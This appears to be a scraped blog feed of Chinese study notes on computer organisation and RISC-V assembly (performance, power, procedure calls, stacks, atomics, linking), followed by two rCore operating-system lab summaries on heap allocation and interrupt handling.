PMD（Personal Mobile Device） 所取代 本书涉猎的内容 高级语言如何转为机器语言，硬件如何执行程序； 软硬件接口是什么，软件如何让硬件执行特定功能； 什么决定了程序的性能，怎么提高性能，降低能耗； 并行计算的原因及其后续演进； 现代计算机架构中的八个伟大思想； 1.2 八个伟大的计算机思想 摩尔定律的发明 抽象化方法 加速常用事务 并行计算 流水线机制 预测机制 内存的金字塔结构 利用冗余提高可靠性 两种 底层软件： 操作系统 和 编译器 1.6 计算机的表现定义时间 运行时间分为 ： 经过时间 ， 相应时间 ， 运行时间 CPU 执行时间分为 ： 单纯执行程序的时间 ， 为了执行程序 而 调用 操作系统的时间 时钟周期数=指令个数$$\\times$$指令平均时钟个数 clock cycles per instrunction,简称 CPI 为所有指令执行的时钟个数的平均 CPU 执行时间 = 指令数 * CPI * 时钟时间 评判标准 要依据不同情况而判断，如一些服务器对IO很依赖，需要软硬件综合性能， 而一些应用则可能只关注 吞吐量 或者反应时间，或者两者的组合。 所以为提高表现，你必须要知道哪些方面影响着他，从而方便找到瓶颈 提高标准 减少应用程序的时钟个数或者提高时钟频率 1.7 功耗墙首先介绍了8代Intel CPU的频率和功耗走势图；需要注意的是在Pentium4（2001）时，频率达到3.6GHz,功耗达到103M，起后频率与功耗都有降低； 其次介绍单个晶体管的动态功耗(焦耳和瓦特角度）： Energy1/2Capacitive load Voltages2 Power1/2Capacitive load Voltages2 Frequency switched Frequency switched和时钟频率相关； with regard to the Figure, how could clock rates grow by a factor of 1000 while power increased by only a factor of 30?(频率有1000倍增长而功耗只有30倍增长) Energy and thus power can be reduced by lowering the voltage，每代CPU都采用这种技术，即每代电压减少15%（0.0225） In 20 years, voltages have gone from 5V to 1V, which is why the increase in power is only 30 times.(0.0225x1000=22.530) 现代的问题是，继续降低电压会使晶体管too leaky（服务器芯片40%功耗来源于leakage） to try to adress the power problem, designers have already attached large devices to increase cooling. and they turn off parts of the chip that are not used in a given clock cycle. 尽管需要高昂的降温设备（300W功耗），这种方案还是应用于PC和server，而PMD则不需要； Power is a challenge for integrated circuits for 2 reasons: power must be brought in and distributed around the chip;现代芯片可能需要数百个ground和power的引脚 power is dissipated as heat and must be removed.(功耗消耗为热量需要更贵的散热设备) 为了解决能耗问题，引入多处理器概念，要求我们要重新编写程序以适应。 Chapter2 计算机 “语言” 介绍2.2 硬件编程语言add a,b,c 将变量b，c相加后放入a中 每个 RISC-V 指令 只执行一个操作，最多允许三个变量 1234&#x2F;&#x2F;例1 a &#x3D; b+c+d+eadd a,b,cadd a,a,dadd a,a,e 设计理念1 ：简单有利于规整化 2.3 操作数RISCV中，算术运算指令的操作数只能来自于寄存器，每个寄存器大小为64bits，只有32个 设计理念2：简洁就是速度 理解：当寄存器变多，硬件寻址时间会随之变长，从而降低性能； 寄存器表示方法 = X + 数字 寄存器的容量是有限的，当需要大的数据结构时，就需要存储在内存中，内存相比于寄存器要大的多，但是访问速度也有数量级的差距。 但算术指令只能操作寄存器，所以我们要先将内存中的数据读入寄存器，进行操作后，再存回内存中，其中 内存-》寄存器 称为 load，寄存器-》内存 称为 store 1234#例子2 ： g&#x3D;h+A[8] A为大64位数据 编译器分配 g-X20 h-X21 A的基址存在X22ld x9, 8(x22) &#x2F;&#x2F; 临时寄存器 x9 得到 A[8]add x20,x21,x9 &#x2F;&#x2F; g &#x3D; h + A[8] 8(x22) 为一种内存表示法，8是偏移量，x22 存储了A数组的基址 现在大部分结构仍然采用 字节 寻址的方式，RISC-V也不例外；所以寄存器和内存都表示为0x8，0x10，0x18 等 在 64bit 中 byte 的排序问题，一般有两种方式： 大端-从大到小，小端-从小到大 RISC-V 采用小端寻址的方式 1234#例子3 A[12]&#x3D;h+A[8]ld x9,64(x22)add x9,x21,x9sd x9,96(x22) 这种平凡的访问内存的行为称为 寄存器溢出 常量 和 立即数RISC-V 将近一半的指令需要操作 立即数 或 常量 123# 例4 ： x22+4ld x9,AddConstant 4(x3) &#x2F;&#x2F; x9 &#x3D; constant 4add x22,x22,x9 程序编译后会将常量4 写入内存中 12# 例5：立即数指令addi x22,x22,4 &#x2F;&#x2F;x22&#x3D;x22+4 注意: 对于常用的常量0 ， RISC-V 将 0 固定放入 x0 中 2.5 指令表示 2.6 逻辑指令左移 右移 AND OR XOR NOT 等 2.7 分支指令两个主要指令： 1234&#x2F;&#x2F; 如果相等则继续beq rs1,rs2,L1&#x2F;&#x2F; 如果不等则继续bne rs1,rs2,L1 例6如何将以下c语言编译为RISC-V格式 123// c 语言if(i==j) f=g+h; else f = g-h; f g h i j x19 x20 x21 x22 x23 12345&#x2F;&#x2F; RISC - V bne x22,x23,Elseadd x19,x20,x21Else: sub x19,x20,x21Exit: 例7 - loops1while(save[i]==k) i+=1; i k 数组基址 x22 x24 x25 1234567Loop: slli x10,x22,3 # x10 &#x3D; i*8 左移三位add x10,x10,x25 # x10 &#x3D; save[i]的地址ld x9,0(x10) # x9 &#x3D; save[i]的值bne x9,x24 Exit #如果 save[i]！&#x3D;k 退出addi x22,x22,1 # i&#x3D;i+1beq x0,x0,Loop #回到开始Exit: 名词解释： 基本块（ basic block） 基本块就是一系列除了结尾就没有分支，除了开始姐们为分支标签的语句，通俗来说，只要基本块中第一条指令被执行了，那么基本块内所有执行都会按照顺序仅执行一次 。编译的第一步就是将程序分成基本块 其他分支语句blt 和 bge 将寄存器的值当做 补码 进行比较 bltu 和 bgeu 将寄存器的值当作无符号数进行比较 12# if x20&gt;&#x3D;x11 or if x20 negativebgeu x20,x11,IndexOutOfBounds 2.8 计算机硬件对过程的支持过程或者函数是用来结构化程序的工具，使用过程能够让程序变得易读且增强代码的重用性，程序员只需要关注任务的一部分。参数可以用来传递和返回值，可以用作过程和其他程序的接口。我们可以认为过程就像一个执行秘密任务的间谍，获取所需资源、执行任务、掩盖行踪，最后带着结果回到原处。任务完成后就不再干涉其他任务。同样我们可以将过程的执行分为六步 : 将参数放在过程能访问的地方 将控制交给过程 获取需要的存储资源给过程 完成预定的任务 将结果放到调用程序能访问的地方 将控制交回源点 由于寄存器是在计算机中最快的存储器，程序应尽可能使用寄存器。RISC-V提供了一些寄存器来给调用过程时使用 : x10-x17 : 存储需要传递的参数 和 返回值 x1 : 存储过程调用源点的地址 除了分配了这些寄存器，RISC-V提供了一条跳转链接指令jal。 1jal ProcedureAddress jal ： 跳转 并 连接 程序结构，主要完成 跳转到ProcedureAddress继续执行 将ProcedureAddress 保存到 x1 寄存器 被执行的过程取到x1地址，并继续执行 1jalr x0,0(x1) 或 直接进行无条件跳转 1jal x0,Label 如果一个过程需要用到多个寄存器，使用完成后还需要恢复，存储多个值是，就需要使用堆栈 例如 1234567long long int leaf_example(long long int g,long long int h, long long int i,long long int j)&#123; long long int f; f=(g+h)-(i+j); return f;&#125; 翻译为汇编语言 12345678910111213141516leaf_example:addi sp,sp,-24sd x5,16(sp)sd x6,8(sp)sd x20,0(sp)add x5,x10,x11add x6,x12,x13sub x20,x5,x6addi x10,x20,0ld x20,0(sp)ld x6,8(sp)ld x5,16(sp)addi sp,sp,24jaalr x0,0(x1) 其中 g/h/i/j对应x10/x11/x12/x13，f对应x20 寄存器分类RISC-V 将 19 个临时寄存器分为两类 x5-x7 and x28-x31 ： 在过程调用时不会被调用方保存的 x8-x9 and x18-x27 ： 在过程调用时一定会被保存的 所以 line3/4/13/14 store和load 的操作可以省去 嵌套程序如果程序 调用其他的函数，我们很好理解，但是 如果调用自己，形成递归过程，我们就要特殊注意了 例子 ： 递归 1234567long long int fact(long long int n)&#123; if(n&lt;1) return(1) else return (n*fact(n-1))&#125;//parameter n存在x10中 123456789101112131415161718192021222324FACT: addi sp,sp,-16 &#x2F;&#x2F;adjust stack for 2 items sd x1,8(sp) &#x2F;&#x2F;save the return address sd x10,0(sp) &#x2F;&#x2F;save the argument n addi x5,x10,-1 &#x2F;&#x2F;x5&#x3D;n-1 bge x5,x0,L1 &#x2F;&#x2F;if(n-1)&gt;&#x3D;0,go to L1 addi x10,x0,1 &#x2F;&#x2F;return 1 addi sp,sp,16 &#x2F;&#x2F;pop 2 items off stack jalr x0,0(x1) &#x2F;&#x2F;return to callerL1: addi x10,x10,-1 &#x2F;&#x2F;n&gt;&#x3D;1: argument gets(n-1) jal x1,FACT &#x2F;&#x2F;call fact with(n-1) addi x6,x10,0 &#x2F;&#x2F;return from jal:move result of fact(n-1) to x6 ld x10,0(sp) &#x2F;&#x2F;restore argument n ld x1,8(sp) &#x2F;&#x2F;restore the return address addi sp,sp,16 &#x2F;&#x2F;adjust stack point to pop 2 items mul x10,x10,x6 &#x2F;&#x2F;return n*fact(n-1) jalr x0,0(x1) &#x2F;&#x2F;return to the caller ​ 注意jal、jalr，ld 等指令指挥这指令跳来跳去，并且将stack的参数一步步的推出； C语言变量可以按照2类分： 类型 数字 字符 生命周期 automatic static automatic对于一个过程而言是本地的，程序调用完成后自动消失； static则贯穿始终；一般用static标识声明； 总结一下 Preserved Not Preserved saved registers：x8-x9,x18-x19 Temprary registers:x5-x7,x28-x31 Stack pointer register:x2(sp) Argument/result register:x10-x17 Frame pointer:x8(fp) Return address:x1(ra) Stack above the stack pointer Stack below the stack pointer 在栈上为新数据申请空间 Stack被称为栈，存储程序调用的automatic型的本地变量； The segment of the stack containing a procdure’s saved registers and local variables is called a procedure frame or activation record. 一些RISC-V编译器使用FP（frame pointer）指向栈的收低值。使用FP的好处是可以很方面的定位local parameter的位置，方便调试与定位； Stack一般是从高地址往低地址递减的； 在堆上为新数据申请空间 Heap被称为堆，存储程序调用的static型变量； Heap是从低地址向高地址增加的； 堆的第一个地址是保留的reserved，接着是text segement（the home of the RISC-V machine code），再往上就是static data segment C语言中用malloc用free来分配和释放heap空间； C语言这种手动分配和释放空间的机制带来了很多bug，相比JAVA则不会； 最后用一个表格来说明RISC-V寄存器的约定： Name Register number Usage Presrved on call x0 0 The constant value 0 n.a x1(ra) 1 Return address(link register) yes x2(sp) 2 Stack pointer yes x3(gp) 3 Global pointer yes x4(tp) 4 Thread pointer yes x5-x7 5-7 Temporaries no x8-x9 8-9 Saved yes x10-x17 10-17 Arguments/results no x18-x27 18-27 Saved yes x28-x31 28-31 Temporaries no 2.9 人机交互计算机如何显示呢，通常使用8bit的ASCII码； 为了方便字符操作，RISC-V提供了两个汇编指令 12lbu x12,0(x10) # 读sb x12,0(x11) # 写 lbu: 无符号加载数据,将字节加载到目的寄存器的最右端； sb: 保存字节,将最右侧的字节存入内存； string有3种表示方式： string第一个地址保留，给出string长度；- JAVA 用一个伴随变量来表示string长度； 最后用一个特殊字符表示string结束； - C RISC-V需要使用load/store 半个机器字指令来load和store一个字符； 12lhu x19,0(x10) &#x2F;&#x2F;Read halfword from sourcesh x10,0(x11) &#x2F;&#x2F;Write halfword to destination 2.10 RISC-V 对于大立即数和 地址 的处理方法2.11 并行 和 指令 ： 同步数据竞争 ： 两个程序 访问同一个数据，一个未写完，一个已经开始读 同步机制通常是由用户级软件例程构建的，这些例程依赖于硬件提供的同步指令 软件之间通过硬件提供的同步指令来构造同步机制， 我们专注于 同步中 的 lock unlock ，这对于单处理器很容易执行 我们在多处理器中实现同步所需要的关键能力是一组具有自动读取和修改内存位置能力的硬件原语; 以atomic exchange/atomic swap为例，它主要完成两个存储之间的数值交换； Lock = 0表示unlock，Lock = 1则表示lock； 从而引出lr.d(读取双保留字)和sc.d(存储有条件的双字) 1234567 addi x12,x0,1 &#x2F;&#x2F;copy locked valueagain: lr.d x10,(x20) &#x2F;&#x2F;load-reserved to read lock bne x10,x0,again &#x2F;&#x2F;check if it is 0 yet sc.d x11,x12,(x20) &#x2F;&#x2F;attempt to store new value bne x11,x0,again &#x2F;&#x2F;branch if store fails sd x0,0(x20) &#x2F;&#x2F;free lock by writing 0 2.12 编译 和 连接 程序本节主要讲从磁盘一段C语言文件到计算机可以执行的程序之间的4个步骤： Compiler Compiler将高级语言编译为通用的汇编（通用的汇编是因为没有目的器件） Assembler Assembler就是器件对应的编译器，将通用汇编编译成对应器件支持的汇编； Linker 链接器，将源文件和 库文件，进行链接 如何做到修改了一行代码而不用重新开始编译； Dynamically Linked Libraries 传统的link libraries的方法是static方法，有一些缺点： The library routines become part of the executable code.木已成舟，再难修改； 所有的routines都要被load，管你要不要； 这些缺点导致了DLL(Dynamically linked libraries)的出现； DLL,where the library routines are not linked an loaded until the program is run Starting a JAVA Program 初步认识一些JVM和JIT吧 各个平台有不同的JVM，如windows JVM，UNIX JVM等，分别负责将JVM虚拟机最终解 Windows和Unix instruction；","link":"","tags":[{"name":"RISC-V","slug":"RISC-V","permalink":"https://dingiso.github.io/tags/RISC-V/"},{"name":"OS","slug":"OS","permalink":"https://dingiso.github.io/tags/OS/"}]},{"title":"实验二总结","date":"2020-07-19T09:27:05.000Z","path":"2020/07/19/实验二/","text":"实验二的分析及解答 实验二 原理：.bss 字段是什么含义？为什么我们要将动态分配的内存（堆）空间放在 .bss 字段？ 放置在此处只是不得以而为之，我们在物理页面分配时需要使用到 Vec，对于操作系统内核我们具有的字段就那么几个，为了让这段空间包含在内核的二进制数据中，放在.bss 中利用了其存放全局变量不会销毁的特性。 分析：我们在动态内存分配中实现了一个堆，它允许我们在内核代码中使用动态分配的内存，例如 Vec Box 等。那么，如果我们在实现这个堆的过程中使用 Vec 而不是 [u8]，会出现什么结果？ vec 需要堆分配器为其分配空间 堆分配器 需要利用 vec 进行分配 会造成互相依赖，互相调用的死锁。 实验 回答：algorithm/src/allocator 下有一个 Allocator trait，我们之前用它实现了物理页面分配。这个算法的时间和空间复杂度是什么？ stacked_Allocator 的时间复杂度 O(1) 空间复杂度 O(n) segment_tree_allocator 的时间复杂度 O(n) ， 空间复杂 O(n) 二选一：实现基于线段树的物理页面分配算法（不需要考虑合并分配）；或尝试修改 FrameAllocator，令其使用未被分配的页面空间（而不是全局变量）来存放页面使用状态。 借助给出的代码和自己的理解实现线段树","link":"","tags":[{"name":"rCore","slug":"rCore","permalink":"https://dingiso.github.io/tags/rCore/"},{"name":"OS","slug":"OS","permalink":"https://dingiso.github.io/tags/OS/"},{"name":"risc-v","slug":"risc-v","permalink":"https://dingiso.github.io/tags/risc-v/"}]},{"title":"实验一总结","date":"2020-07-12T05:21:32.000Z","path":"2020/07/12/实验一/","text":"实验一的分析及解答 实验题 for lab-1主要修改了 entry.asm main.rs handler.rs 将三个文件上传上来 x0 寄存器 默认存储0x0 ，可直接无条件跳转即可 1jr x0 或 使下一条运行的指令为 0x0 ，通过改变x1寄存器 1ld x1 ,(x0) handle_interrupt 函数增加处理项，处理访问错误地址的情况，如果 stval 值为0则打印SUCCESS！ 简述题1.在 rust_main 函数中，执行 ebreak 命令后至函数结束前，sp 寄存器的值是怎样变化的? 即分析 interrupt.asm .处理中断过程中, 12345678910111213addi sp,sp, -34*8 # 对 sp 减 栈上开辟 Context 所需空间SAVE x1, 1addi x1, sp, 34*8SAVE x1, 2# 先存x1,再利用x1存放原来sp值 , 不动用 x2(sp) 以正确使用 SAVE 宏mv a0 sp# 将 sp 作为参数调用 handle_interruptLOAD x2, 2# 最后将 sp(x2) 的值恢复 2.回答：如果去掉 rust_main 后的 panic 会发生什么，为什么？ 12345678910111213141516171819202122230000000080200000 text_start:80200000: 17 61 01 00 auipc sp, 2280200004: 13 01 01 59 addi sp, sp, 142480200008: 97 10 00 00 auipc ra, 18020000c: e7 80 a0 13 jalr 314(ra)0000000080200014 _ZN4core3ptr24slice_from_raw_parts_mut17h5b8d4c2d17da80d3E:; pub const fn slice_from_raw_parts_mut&lt;T&gt;(data: *mut T, len: usize) -&gt; *mut [T] &#123;80200014: 79 71 addi sp, sp, -4880200016: 2a f0 sd a0, 32(sp)80200018: 2e f4 sd a1, 40(sp); unsafe &#123; Repr &#123; raw: FatPtr &#123; data, len &#125; &#125;.rust_mut &#125;8020001a: 2a e8 sd a0, 16(sp)8020001c: 2e ec sd a1, 24(sp)8020001e: 2a e0 sd a0, 0(sp)80200020: 2e e4 sd a1, 8(sp); &#125;80200022: 45 61 addi sp, sp, 4880200024: 82 80 ret0000000080200026 _ZN4core3str11unwrap_or_017h6844c978da275184E:; fn unwrap_or_0(opt: Option&lt;&amp;u8&gt;) -&gt; u8 &#123;80200026: 41 11 addi sp, sp, -16 可以看到 rust_main后还有许多rust库函数,可能会直接以运行库函数造成不明错误或死循环 代码 在 实验题1","link":"","tags":[{"name":"OS","slug":"OS","permalink":"https://dingiso.github.io/tags/OS/"},{"name":"risc-v","slug":"risc-v","permalink":"https://dingiso.github.io/tags/risc-v/"}]}]